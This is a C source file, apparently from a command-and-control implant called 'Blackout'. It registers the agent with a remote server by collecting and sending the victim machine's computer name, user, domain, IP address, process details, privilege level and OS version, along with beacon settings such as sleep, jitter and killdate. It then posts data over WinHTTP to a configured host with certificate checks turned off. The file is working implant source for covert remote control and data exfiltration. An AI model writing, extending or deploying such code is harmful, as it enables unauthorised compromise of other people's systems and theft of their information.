#include <communication.h>
#include <common.h>
#include <utils.h>

FUNC BOOL TransportInit()
{
    BLACKOUT_INSTANCE

    PPACKAGE Package = NULL;
    BOOL     Success = FALSE;
    PVOID    Data    = NULL;
    UINT64   Length  = 0x00;

    Package = PackageCreate( COMMAND_REGISTER );

    // Add data
    /*
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes
        [ Demon ID     ] 4 bytes
        [ User Name    ] size + bytes
        [ Host Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
    */

    // Add AES Keys/IV
    // PackageAddPad( Package, Blackout.Config.AES.Key, 32 );
    // PackageAddPad( Package, Blackout.Config.AES.IV,  16 );
    
    PackageAddInt32(   Package, Instance()->Session.AgentId       );
    PackageAddString(  Package, Instance()->System.ComputerName   );
    PackageAddString(  Package, Instance()->System.UserName       );
    PackageAddString(  Package, Instance()->System.DomainName     );
    PackageAddString(  Package, Instance()->System.IpAddress      );
    PackageAddWString( Package, Instance()->Session.ProcessName   );
    PackageAddInt32(   Package, Instance()->Session.ProcessId     );
    PackageAddInt32(   Package, Instance()->Session.ParentProcId  );
    PackageAddInt32(   Package, Instance()->Session.ProcessArch   );
    PackageAddInt32(   Package, Instance()->Session.Elevated      ); 

    PackageAddInt32( Package, Instance()->System.OsMajorV );
    PackageAddInt32( Package, Instance()->System.OsMinorv );
    PackageAddInt32( Package, Instance()->System.ProductType );
    PackageAddInt32( Package, 0x00 );
    PackageAddInt32( Package, Instance()->System.OsBuildNumber );

    PackageAddInt32( Package, Instance()->System.OsArch );
    PackageAddInt32( Package, Instance()->Session.SleepTime );
    PackageAddInt32( Package, Instance()->Session.Jitter );
    PackageAddInt32( Package, 0x00 ); //killdate
    PackageAddInt32( Package, 0x00 ); //workinghours
    // End of Options

    if ( PackageTransmit( Package, &Data, &Length ) )
    {
        BK_PRINT("TRANSMITTED PACKAGE!\n");

        if ( Data )
        {
            BK_PRINT( "Agent => %x : %x\n", ( UINT32 ) C_DEF( Data ), ( UINT32 ) Instance()->Session.AgentId );
            if ( ( UINT32 ) Instance()->Session.AgentId == ( UINT32 ) C_DEF( Data ) )
            {
                BK_PRINT("CONNECTED!\n");
                Instance()->Session.Connected = TRUE;
                Success = TRUE;
            }
        }
        else
        {
            Success = FALSE;
        }
    }

    return Success;
}

FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )
{
    BLACKOUT_INSTANCE

    HANDLE  hConnect        = NULL;
    HANDLE  hSession        = NULL;
    HANDLE  hRequest        = NULL;
    LPWSTR  HttpEndpoint    = NULL;
    DWORD   HttpFlags       = 0;
    DWORD   HttpAccessType  = 0;
    LPCWSTR HttpProxy       = NULL;
    DWORD   BufRead         = 0;
    UCHAR   Buffer[ 1025 ]  = { 0 };
    PVOID   RespBuffer      = NULL;
    SIZE_T  RespSize        = 0;
    BOOL    Successful      = FALSE;

    hSession = Instance()->Win32.WinHttpOpen( Transport().Http.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
    if ( ! hSession )
    {
        BK_PRINT( "[HTTP] WinHttpOpen: Failed => %d\n", NtGetLastError() );
        Successful = FALSE;
        goto LEAVE;
    }

    hConnect = Instance()->Win32.WinHttpConnect( hSession, Transport().Http.Host, Transport().Http.Port, 0 );
    BK_PRINT( "[HTTP] > WinHttpConnect=> %d\n", NtGetLastError() );
    if ( ! hConnect )
    {
        BK_PRINT( "[HTTP] WinHttpConnect: Failed => %d\n", NtGetLastError() );
        Successful = FALSE;
        goto LEAVE;
    }

    HttpEndpoint = L"index.php";
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Transport().Http.Secure ){
        HttpFlags |= WINHTTP_FLAG_SECURE;
    }

    hRequest = Instance()->Win32.WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
    BK_PRINT( "[HTTP] > WinHttpOpenRequest=> %d\n", NtGetLastError() );

    if ( ! hRequest )
    {
        BK_PRINT( "[HTTP] WinHttpOpenRequest: Failed => %d\n", NtGetLastError() );
        return FALSE;
    }

    if ( Transport().Http.Secure )
    {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if ( ! Instance()->Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            BK_PRINT( "[HTTP] WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }else{
            BK_PRINT( "[HTTP] > WinHttpSetOption => %d\n", NtGetLastError() );

        }
    }

    if ( Instance()->Win32.WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, 0x0 ) )
    {
        if ( RecvData && Instance()->Win32.WinHttpReceiveResponse( hRequest, NULL ) )
        {
            RespBuffer = NULL;
            do
            {
                Successful = Instance()->Win32.WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
                if ( ! Successful || BufRead == 0 )
                {
                    if ( ! Successful )
                        BK_PRINT( "[HTTP] WinHttpReadData: Failed (%d)\n", NtGetLastError() );
                    break;
                }

                if ( ! RespBuffer )
                    RespBuffer = Instance()->Win32.LocalAlloc( LPTR, BufRead );
                else
                    RespBuffer = Instance()->Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );

                RespSize += BufRead;

                MmCopy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                MmSet( Buffer, 0, 1024 );

            } while ( Successful == TRUE );


            if ( RecvSize )
                *RecvSize = RespSize;

            if ( RecvData )
                *RecvData = RespBuffer;

            Successful = TRUE;
        }
    }
    else
    {
        if ( NtGetLastError() == 12029 ) { // ERROR_INTERNET_CANNOT_CONNECT
            Instance()->Session.Connected = FALSE;
        }else {
            BK_PRINT("[HTTP] WinHttpSendRequest: Failed => %d\n", NtGetLastError());
        }
        Successful = FALSE;
        goto LEAVE;
    }

LEAVE:
    Instance()->Win32.WinHttpCloseHandle( hSession );
    Instance()->Win32.WinHttpCloseHandle( hConnect );
    Instance()->Win32.WinHttpCloseHandle( hRequest );

    return Successful;
}